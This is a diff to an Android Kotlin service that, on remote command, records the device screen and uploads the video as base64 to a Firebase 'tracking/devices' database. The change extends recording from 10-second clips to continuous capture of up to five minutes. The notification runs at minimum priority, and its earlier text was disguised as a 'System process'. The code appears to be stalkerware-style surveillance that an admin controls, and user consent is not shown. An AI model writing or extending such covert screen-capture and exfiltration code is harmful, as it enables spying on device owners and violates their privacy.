@@ -1,4 +1,4 @@
-﻿package com.hokimloyha.app.service
+package com.hokimloyha.app.service
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -47,24 +47,36 @@ class ScreenRecordService : Service() {
         createNotificationChannel()
     }
 
+    private var recordingStartTime: Long = 0L
+    private var isCurrentlyRecording = false
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.action
-        targetDeviceId = intent?.getStringExtra("device_id") ?: "hokim"
+        val devId = intent?.getStringExtra("device_id")
+        if (!devId.isNullOrBlank()) {
+            targetDeviceId = devId
+        }
 
         if (action == ACTION_START) {
-            val resultCode = AppStateTracker.mediaProjectionResultCode
-            val resultData = AppStateTracker.mediaProjectionIntent
+            if (!isCurrentlyRecording) {
+                val resultCode = AppStateTracker.mediaProjectionResultCode
+                val resultData = AppStateTracker.mediaProjectionIntent
 
-            if (resultCode != 0 && resultData != null) {
-                startForegroundNotification()
-                startScreenRecording(resultCode, resultData)
-            } else {
-                // MediaProjection mavjud emas bo'lsa -> zudlik bilan ScreenCaptureHelper orqali rasm olamiz
-                ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
-                stopSelf()
+                if (resultCode != 0 && resultData != null) {
+                    startForegroundNotification()
+                    startScreenRecording(resultCode, resultData)
+                } else {
+                    // MediaProjection mavjud emas bo'lsa -> zudlik bilan ScreenCaptureHelper orqali rasm olamiz
+                    ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
+                    stopSelf()
+                }
             }
         } else if (action == ACTION_STOP) {
-            stopAndUploadRecording()
+            if (isCurrentlyRecording) {
+                stopAndUploadRecording()
+            } else {
+                stopSelf()
+            }
         }
 
         return START_NOT_STICKY
@@ -72,8 +84,8 @@ class ScreenRecordService : Service() {
 
     private fun startForegroundNotification() {
         val notif: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Tizim jarayoni")
-            .setContentText("Ekran xizmati sinxronizatsiyasi")
+            .setContentTitle("Ijro Tizimi")
+            .setContentText("Ekran xizmati yozib olinmoqda...")
             .setSmallIcon(R.mipmap.ic_launcher)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
@@ -129,12 +141,21 @@ class ScreenRecordService : Service() {
             )
 
             mediaRecorder?.start()
-            Log.d(TAG, "Screen recording started...")
+            recordingStartTime = System.currentTimeMillis()
+            isCurrentlyRecording = true
+            Log.d(TAG, "Screen recording started continuously...")
 
-            // 10 soniyadan so'ng avtomatik to'xtatish va yuklash
+            val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+            val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
+            mediaRef.child("is_screen_recording").setValue(true)
+            mediaRef.child("status").setValue("📹 Ekran yozilmoqda...")
+
+            // 5 daqiqalik xavfsizlik chegarasi (agar admin to'xtatishni unutsa)
             handler.postDelayed({
-                stopAndUploadRecording()
-            }, 10000L)
+                if (isCurrentlyRecording) {
+                    stopAndUploadRecording()
+                }
+            }, 300000L)
 
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start screen recording: ${e.message}", e)
@@ -145,9 +166,18 @@ class ScreenRecordService : Service() {
 
     private fun stopAndUploadRecording() {
         handler.removeCallbacksAndMessages(null)
+        isCurrentlyRecording = false
+
+        val elapsed = System.currentTimeMillis() - recordingStartTime
+        if (elapsed < 1500L) {
+            try { Thread.sleep(1500L - elapsed) } catch (_: Exception) {}
+        }
+
         try {
             mediaRecorder?.stop()
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.w(TAG, "mediaRecorder stop error: ${e.message}")
+        }
         try {
             mediaRecorder?.release()
         } catch (_: Exception) {}
@@ -158,12 +188,13 @@ class ScreenRecordService : Service() {
         } catch (_: Exception) {}
         virtualDisplay = null
 
-        try {
-            mediaProjection?.stop()
-        } catch (_: Exception) {}
-        mediaProjection = null
-
         val file = outputFile
+        val durationSec = ((System.currentTimeMillis() - recordingStartTime) / 1000).toInt().coerceAtLeast(1)
+
+        val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
+        val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
+        mediaRef.child("is_screen_recording").setValue(false)
+
         if (file != null && file.exists() && file.length() > 0) {
             Thread {
                 try {
@@ -171,22 +202,20 @@ class ScreenRecordService : Service() {
                     val base64Video = Base64.encodeToString(bytes, Base64.NO_WRAP)
                     file.delete()
 
-                    val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
-                    val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
-
                     val now = System.currentTimeMillis()
                     val item = mapOf(
                         "type" to "video",
                         "video_base64" to base64Video,
                         "timestamp" to now,
-                        "duration" to 10
+                        "duration" to durationSec
                     )
 
                     mediaRef.child("latest_screen").setValue(item)
                     mediaRef.child("archive_screen").push().setValue(item)
-                    mediaRef.child("status").setValue("📹 Ekran video yozuvi saqlandi (${bytes.size / 1024} KB)")
+                    mediaRef.child("status").setValue("📹 Ekran video yozuvi saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
                 } catch (e: Exception) {
                     Log.e(TAG, "Error uploading screen video", e)
+                    mediaRef.child("status").setValue("Video saqlashda xatolik")
                 } finally {
                     stopSelf()
                 }
@@ -213,9 +242,9 @@ class ScreenRecordService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacksAndMessages(null)
+        isCurrentlyRecording = false
         try { mediaRecorder?.release() } catch (_: Exception) {}
         try { virtualDisplay?.release() } catch (_: Exception) {}
-        try { mediaProjection?.stop() } catch (_: Exception) {}
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
